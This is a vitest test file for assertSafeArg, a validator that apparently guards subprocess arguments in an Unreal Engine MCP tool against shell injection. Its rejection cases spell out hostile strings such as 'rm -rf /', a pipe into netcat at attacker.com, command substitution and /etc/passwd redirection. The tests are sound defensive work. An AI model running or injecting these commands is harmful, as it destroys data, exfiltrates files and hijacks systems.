import { describe, expect, it } from "vitest";
import type { UnrealMcpError } from "../utils/errors.js";
import { assertSafeArg } from "./subprocess.js";

describe("assertSafeArg", () => {
	it("allows typical build arguments: flags, paths, target names", () => {
		const safe = [
			"-project=/Game/MyProject.uproject",
			"-platform=Win64",
			"-configuration=Development",
			"BuildCookRun",
			"C:\\Program Files\\Epic Games\\UE_5.4",
			"-map=Level1+Level2",
			"-Target=MyGameEditor",
		];
		for (const arg of safe) {
			expect(() => assertSafeArg(arg)).not.toThrow();
		}
	});

	it.each([
		["semicolon (command chaining)", "foo; rm -rf /"],
		["ampersand (background/chaining)", "foo & evil"],
		["pipe", "foo | nc attacker.com 1234"],
		["backtick (command substitution)", "foo`whoami`"],
		["dollar sign (variable/command substitution)", "foo$(whoami)"],
		["less-than (input redirection)", "foo < /etc/passwd"],
		["greater-than (output redirection)", "foo > /etc/passwd"],
		["embedded newline", "foo\nrm -rf /"],
		["embedded carriage return", "foo\rrm -rf /"],
	])("rejects an argument containing a %s", (_label, arg) => {
		expect(() => assertSafeArg(arg)).toThrow(/UNSAFE_ARGUMENT|unsafe subprocess argument/i);
	});

	it("reports the code UNSAFE_ARGUMENT and echoes the offending argument in details", () => {
		let caught: unknown;
		try {
			assertSafeArg("evil; rm -rf /");
		} catch (err) {
			caught = err;
		}
		expect(caught).toBeInstanceOf(Error);
		const e = caught as UnrealMcpError;
		expect(e.code).toBe("UNSAFE_ARGUMENT");
		expect(e.details).toEqual({ arg: "evil; rm -rf /" });
	});
});
